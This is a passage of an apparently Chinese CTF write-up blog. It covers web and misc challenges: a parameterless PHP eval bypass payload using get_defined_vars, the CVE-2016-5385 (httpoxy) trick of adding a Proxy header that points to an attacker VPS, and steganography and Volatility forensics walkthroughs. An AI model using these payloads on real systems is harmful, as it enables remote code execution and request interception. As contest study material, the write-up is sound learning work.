</code>这里正则匹配了输入的code字符，有参数就会替换为空。也就是说我们可以<code>?code=phpinfo();</code>就会显示phpinfo信息，但是如果<code>system(&#39;ls&#39;);</code>这样就会被过滤，也就是说括号里不能有参数，可以这样<code>a(b())</code>,但是不能这样<code>a(&#39;b&#39;)</code>，就是无参数rce。<br>这边我看到题<code>if(!preg_match(&#39;/session|end|next|header|dir/i&#39;,$_GET[&#39;code&#39;]))&#123;</code><br>对一些字符进行了过滤，正常我们有两种选择一种rce，一种文件读取，<br>题目也给我们了 提示rce，因为这里过滤了end，header，session，所以我们使用<code>get_defined_vars ()</code>函数<br>get_defined_vars()：返回由所有已定义变量所组成的数组<br><img src="/images/changanzhanyi/1.png" alt="1"><br>get传参后数组里就会有get传递的值</p><p>current : 返回数组中的当前单元，每个数组中都有一个内部的指针指向它“当前的”单元，初始指向插入到数组中的第一个单元。</p><p>和current类似的函数<br>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>next() - 将内部指针指向数组中的下一个元素，并输出。<br>prev() - 将内部指针指向数组中的上一个元素，并输出。<br>reset() - 将内部指针指向数组中的第一个元素，并输出。<br>each() - 返回当前元素的键名和键值，并将内部指针向前移动。</p><p>a=eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br>构造payload<br>这里过滤了end  最后一个元素，我们可以用reset也就是第一个元素<br>把传递的参数写前面，这样<code>a=phpinfo();&amp;code=eval(reset(current(get_defined_vars())))</code><br>随便传一个参数，但是要放在最前面这样的话就可以进行rce了<br><img src="/images/changanzhanyi/2.png" alt="image-20220118141207013"></p><h5 id="flag配送中心"><a href="#flag配送中心" class="headerlink" title="flag配送中心"></a>flag配送中心</h5><p>emmmm太菜了  不会，右键源代码有提示，<!--Powered by PHP 5.6.23 + fastcgi--><br>复现一下，<code>CVE-2016-5385 </code><br>抓包，包里加上<code>Proxy: http://xxx.xxx.xxx.xxx:xxxx/</code><br>就可以了，vps监听一下，详细，百度 cve-2016-5385<br><img src="/images/changanzhanyi/31.png" alt="image-20220120164323864"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h5><p>拿到压缩包，是一个流量包，放到network流量看到有一个secret.txt和hint.txt的流量包不一样大，直接右键提出来，<br><img src="/images/changanzhanyi/3.png" alt="image-20220118151527186"><br><img src="/images/changanzhanyi/4.png" alt="image-20220118151613193"><br><img src="/images/changanzhanyi/5.png" alt="image-20220118152247852"><br>显然这里base64转一下secret内容pk开头是一个zip包，我们保存下来，改一下后缀，解压一下里面是很多图片，拼图，再看一下hint.txt,<br><img src="/images/changanzhanyi/6.png" alt="image-20220118152825786"><br>base32的提示，然后就可以愉快的拼图了。<br>手工拼图很累，我们这里使用工具<br><img src="/images/changanzhanyi/7.png" alt="image-20220118154452731"><br><img src="/images/changanzhanyi/8.png" alt="image-20220118154522615"><br>先看下信息，每个小图片都是100*100的总共49个项目，去掉dsstore 还剩48个，可能是6x8的，也可能是4x12，这里用4x12的 把所有的小图片用<code>montage</code>拼成一个大图片，然后用<code>gaps</code>进行还原<br><code>montage *png -tile 12x4 -geometry 100x100+0+0 out.png</code><br>-tile是拼接时每行和每列的图片数。这里用12x4，就是12列4行，也就是长12张图片高4张<br>-geometry是每个小图片的像素，后面的+0+0是边框是0，<br><img src="/images/changanzhanyi/9.png" alt="image-20220118160159420"><br>拼成一个大图片后，直接用gaps,我们不能确定generations，可以加个version，它可以一个个显示，多运行几遍，中间看那个清楚，截图就可以了<br><code>gaps --image=out1.png --generations=100 --population=48 --size=100 --verbose</code><br>–image            指向拼图的路径<br>–size            拼图块的像素尺寸<br>–generations    遗传算法的代的数量<br>–population    个体数量<br>–verbose        每一代训练结束后展示最佳结果<br>–save            将拼图还原为图像<br><img src="/images/changanzhanyi/10.png" alt="image-20220118161022716"></p><h5 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h5><p>下载附件后，是一个文件file一下<br><img src="/images/changanzhanyi/11.png" alt="image-20220118171304054"><br>是一个class文件，果断改成.class后拖到jd-gui里，看起来像是asccii，很长，脚本<br><img src="/images/changanzhanyi/12.png" alt="image-20220118171417093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(chr(int(i)),end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==&quot;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>0101的组合，长和宽都是37位，果断猜一下转二维码，脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">37</span>   <span class="comment">#注意这里一定要看一下高度和宽度</span></span><br><span class="line">y = <span class="number">37</span></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (x, y))</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\python\\misc\\key.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        ff = f.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">if</span> ff[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                im.putpixel((i, j), black)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                im.putpixel((i, j), white)</span><br><span class="line">im.save(<span class="string">&quot;D:\\vscodework\\python\\misc\\1.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/changanzhanyi/13.png" alt="image-20220118172445205"></p><h5 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h5><p>下载附件，解压一下有密码，有注释，六个数字<br><img src="/images/changanzhanyi/14.png" alt="image-20220118202827001"><br>爆破一下密码220101<br><img src="/images/changanzhanyi/15.png" alt="image-20220118202926688"><br>两个文件，一个emjio表情，理论上来说是emjio加密，一个pyc文件，反编译出来  没啥用，就不会了<br>后来看大师傅的wp，是剑龙加密，<code>https://github.com/AngelKitty/stegosaurus</code><br><img src="/images/changanzhanyi/16.png" alt="image-20220118204451068">接一下有个key<br>拿去emjio解密<code>https://aghorler.github.io/emoji-ae</code><br><img src="/images/changanzhanyi/17.png" alt="image-20220118204700866"><br><img src="/images/changanzhanyi/18.png" alt="image-20220118204716886"></p><h5 id="无字天书"><a href="#无字天书" class="headerlink" title="无字天书"></a>无字天书</h5><p>拿到附件解压一下，过滤http和1.php 1.php是个冰蝎的马子<br>有一个读取文件的操作，追踪http流，下面<code>504b0304</code>是zip16进制头<br><img src="/images/changanzhanyi/19.png" alt="image-20220119144025872"><br><img src="/images/changanzhanyi/20.png" alt="image-20220119144107117"><br>复制出来用winhex做一个，解压是两个文件<code>.ws</code>文件是whitespace加密，解密一下，是密码，在线网址<code>http://vii5ard.github.io/whitespace/</code><br><img src="/images/changanzhanyi/21.png" alt="image-20220119150500514"><br><img src="/images/changanzhanyi/22.png" alt="image-20220119144904711"><br><code>XiAnWillBeSafe</code><br>然后是snow加密，项目地址在下面，解密一下就出了<br><img src="/images/changanzhanyi/23.png" alt="image-20220119150041048"><br><code>http://www.darkside.com.au/snow/</code></p><h5 id="朴实无华的取证"><a href="#朴实无华的取证" class="headerlink" title="朴实无华的取证"></a>朴实无华的取证</h5><p>拿到文件先看一下镜像系统信息<br><code>python2 vol.py -f xp_sp3.raw imageinfo</code><br><img src="/images/changanzhanyi/24.png" alt="image-20220120160029257"><br>是winxpsp2x86,看下file，一般filescan给出的信息太多了，题目如果给提示的话，一般grep下提示，不给的话grepflag<br><code>python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 filescan | grep &#39;flag&#39;</code><br><img src="/images/changanzhanyi/25.png" alt="image-20220120160645562"><br>我们可以看到桌面上有flag.zip和flag.png，统统提取出来看下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001b34f90 -D ./cab -u</span><br><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001e65028 -D ./cab -u</span><br></pre></td></tr></table></figure><p>我们file一下  改下名字  好区分<br><img src="/images/changanzhanyi/26.png" alt="image-20220120161811945"><br>zip压缩包是有密码的<br><img src="/images/changanzhanyi/27.png" alt="image-20220120162354291"><br>cmd中还有一个日记，提出来<img src="/images/changanzhanyi/28.png" alt="image-20220120162811234"><br>看到是密码，解压一下，里面是加密的代码<br><img src="/images/changanzhanyi/29.png" alt="image-20220120162911649"><br><img src="/images/changanzhanyi/30.png" alt="image-20220120162945826"><br>把flag图片里的内容提出来，转换一下就出了</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> 长安杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021强网杯wp</title>
      <link href="/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"/>
      <url>/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</url>
      
